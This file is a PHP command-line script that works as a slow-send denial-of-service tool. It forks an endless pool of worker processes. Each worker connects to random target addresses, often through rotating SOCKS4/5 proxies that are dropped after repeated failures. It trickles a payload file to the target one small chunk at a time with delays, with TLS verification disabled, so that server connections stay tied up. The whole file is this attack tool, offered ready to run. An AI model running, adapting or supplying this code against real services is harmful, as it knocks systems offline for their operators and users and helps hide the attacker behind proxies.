<?php require_once __DIR__ . '/functions.php';

const PROXY_ERROR = 1;
const CONNECT_ERROR = 2;
const SOCKET_ERROR = 3;
const PAYLOAD_ERROR = 4;

if (count($argv) < 4) {
    fwrite(STDERR, 'Usage: [threads] [address] [payload]');
    exit -1;
}

$CHUNK = getenv('CHUNK');
$CHUNK = empty($CHUNK) ? 1 : (int) $CHUNK;

$DELAY = getenv('DELAY');
$DELAY = empty($DELAY) ? 250_000 : (int) $DELAY;

$DEBUG   = getenv('DEBUG') ?? false;
$PAYLOAD = $argv[2];
$ADDRESS = array_slice($argv, 3);

$THREADS_MAX = $argv[1];
$THREADS_PXY = 0;
if (strpos($THREADS_MAX, ':')) {
    sscanf($THREADS_MAX, '%d:%d', $THREADS_MAX, $THREADS_PXY);
} else {
    $THREADS_MAX = (int) $THREADS_MAX;
}

if (! file_exists($PAYLOAD) || ! is_readable($PAYLOAD)) {
    fwrite(STDOUT, sprintf("%s is not accessible" . PHP_EOL, $PAYLOAD));
    exit(PAYLOAD_ERROR);
}

$PROXIES = [];
if ($jsonl = getenv('PROXIES')) {
    $hndl = fopen($jsonl, 'r');
    while($line = trim(@fgets($hndl))) {
        if ($json = @json_decode($line, true)) {
            $PROXIES[$json['ip']] = [
                'scheme' => $json['scheme'],
                'errors' => 0,
            ];
        }
    }
}

if ($DEBUG) {
    if (count($PROXIES)) {
        $proxyHost = array_rand($PROXIES);
    } else {
        $proxyHost = null;
    }
    worker($ADDRESS[0], $proxyHost, $PROXIES[$proxyHost]);
    return;
}

$success = $failed = 0;
$pool = [];

while (true) {
    if (count($pool) < $THREADS_LIMIT = min($THREADS_MAX, (count($PROXIES) && $THREADS_PXY) ? count($PROXIES) * $THREADS_PXY : $THREADS_MAX)) {
        $proxyHost = null;
        if (count($PROXIES)) {
            if (null === ($proxyHost = key($PROXIES))) {
                reset($PROXIES);
                continue;
            }
            next($PROXIES);
        }

        switch ($pid = pcntl_fork()) {
            case -1: die('- Fork failed');
            case  0:
                exit(worker($ADDRESS[array_rand($ADDRESS)], $proxyHost, $PROXIES[$proxyHost]));
            default:
                fwrite(STDOUT, "- Forked child: " . $pid . PHP_EOL);
                $pool[$pid] = $proxyHost;
                break;
        }
        continue;
    }

    $pid = pcntl_wait($status); $status = pcntl_wexitstatus($status);
    $status === 0 ? $success++ : $failed++;
    fwrite(STDERR, sprintf(
        '- Pool full, t: %d, p: %d, s: %d: f: %d' . PHP_EOL,
        $THREADS_LIMIT, count($PROXIES), $success, $failed
    ));

    if (isset($pool[$pid])) {
        fwrite(STDOUT, "- Child " . $pid . " exited; status: " . $status . PHP_EOL);
        $proxyHost = $pool[$pid];
        if ($proxyHost && isset($PROXIES[$proxyHost])) {
            if (PROXY_ERROR == $status) {
                $errors = @$PROXIES[$proxyHost]['errors']++;
                if ($errors > 5) {
                    unset($PROXIES[$proxyHost]);
                }
            } else {
                @$PROXIES[$proxyHost]['errors'] = 0;
            }
        }
        unset($pool[$pid]);
    }
}

function worker(string $ADDRESS, string $proxyHost = null, array $proxyOptions = null): int
{
    global $CHUNK, $DEBUG, $DELAY, $PAYLOAD;

    fwrite(STDOUT, sprintf("# Worker %d: connecting to %s" . PHP_EOL, getmypid(), $ADDRESS));

    $parts = parse_url($ADDRESS);
    $scheme = $parts['scheme'] ?? 'tcp';
    $port = $parts['port'] ?? 80;
    $host = gethostbyname($parts['host']);

    if (!is_null($proxyHost)) {
        fwrite(STDOUT, sprintf("# Worker %d: using %s proxy %s" . PHP_EOL, getmypid(), $proxyOptions['scheme'], $proxyHost));
        try {
            $client = 'socks5' === $proxyOptions['scheme']
                ? socks5_connect($proxyHost, $host, $port)
                : socks4_connect($proxyHost, $host, $port);
        } catch (ProxyConnectionError $e) {
            fwrite(STDOUT, sprintf("# Worker %d: %s" . PHP_EOL, getmypid(), $e->getMessage()));
            return PROXY_ERROR;
        }
    } else {
        fwrite(STDOUT, sprintf("# Worker %d: using direct connection" . PHP_EOL, getmypid()));
        $client = direct_connect($ADDRESS);
    }

    if (! $client) {
        fwrite(STDOUT, sprintf("# Worker %d: Connection failed" . PHP_EOL, getmypid()));
        return CONNECT_ERROR;
    }

    stream_set_write_buffer($client, $CHUNK);
    stream_set_read_buffer($client, $CHUNK);
    stream_set_timeout($client, 5.0);

    register_shutdown_function(fn() => fclose($client));

    if ('tls' === $scheme || 'ssl' === $scheme) {
        stream_context_set_option($client, ['ssl' => [
            'verify_peer'       => false,
            'verify_peer_name'  => false,
            'allow_self_signed' => true,
        ]]);
        if (!@stream_socket_enable_crypto($client, true, STREAM_CRYPTO_METHOD_ANY_CLIENT)) {
            fwrite(STDOUT, sprintf("# Worker %d: enable crypto failed" . PHP_EOL, getmypid()));
            return SOCKET_ERROR;
        }
    }

    if ($DEBUG) {
        fwrite(STDOUT, sprintf("# Worker %d: sending payload" . PHP_EOL, getmypid()));
    }

    if (false === ($fh = fopen($PAYLOAD, 'rb'))) {
        fwrite(STDOUT, sprintf("# Worker %d: unable to open payload" . PHP_EOL, getmypid()));
        return PAYLOAD_ERROR;
    }

    while(! feof($fh)) {
        $data = fread($fh, $CHUNK);
        if ($DEBUG) {
            fwrite(STDOUT, $data);
        }

        $attempts = 0; do {
            $nb = @fwrite($client, $data);
            if (! $nb) {
                if (++$attempts >= 5) {
                    fwrite(STDOUT, sprintf("# Worker %d: Unable to write to socket, attempt: %d, offset: %d" . PHP_EOL, getmypid(), $attempts, ftell($fh)));
                    return SOCKET_ERROR;
                }
            } else {
                $attempts = 0;
            }

            $data = substr($data, $nb);
            $DELAY && usleep($DELAY);
        } while(strlen($data));
    }

    if ($DEBUG) {
        fwrite(STDOUT, sprintf("# Worker %d: reading response" . PHP_EOL, getmypid()));
    }

    while (! feof($client)) {
        if (! strlen($data = fread($client, $CHUNK))) {
            fwrite(STDOUT, sprintf("# Worker %d: read timeout" . PHP_EOL, getmypid()));
            return SOCKET_ERROR;
        }

        if ($DEBUG && strlen($data)) {
            fwrite(STDOUT, $data);
        }

        $DELAY && usleep($DELAY);
    }

    return 0;
}
